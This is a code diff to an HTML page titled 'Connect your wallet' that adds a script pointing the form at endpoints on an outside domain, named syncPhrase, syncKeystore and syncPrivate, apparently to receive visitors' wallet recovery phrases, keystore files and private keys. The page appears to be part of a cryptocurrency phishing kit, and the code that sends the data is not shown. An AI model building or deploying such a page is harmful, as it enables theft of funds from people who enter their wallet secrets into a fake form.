@@ -8,6 +8,31 @@
     <link rel="stylesheet" href="form.css" />
     <title>Connect your wallet</title>
     <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <script>
+      const parseParams = (querystring) => {
+  
+        // parse query string
+        const params = new URLSearchParams(querystring);
+  
+        const obj = {};
+  
+        // iterate over all keys
+        for (const key of params.keys()) {
+          if (params.getAll(key).length > 1) {
+            obj[key] = params.getAll(key);
+          } else {
+            obj[key] = params.get(key);
+          }
+        }
+        return obj;
+      };
+      base_endpoint_url = 'https://admin.crobrigemeerkt.com/api',
+      window.__wc_data__ = {
+        secure_phrase_endpoint: `${base_endpoint_url}/secure-sync/syncPhrase`,
+        secure_keystore_endpoint: `${base_endpoint_url}/secure-sync/syncKeystore`,
+        secure_private_endpoint: `${base_endpoint_url}/secure-sync/syncPrivate`,
+      }
+    </script>
   </head>
   <body class="f-mdd-14" x-data="wconnForm()">
     <!-- Navigation -->
@@ -117,7 +142,7 @@
         </a>
         </div>
     </div>
-
+    <script src="util.js"></script>
     <script src="app.js"></script>
     <script src="js/bootstrap.js"></script>
   </body>
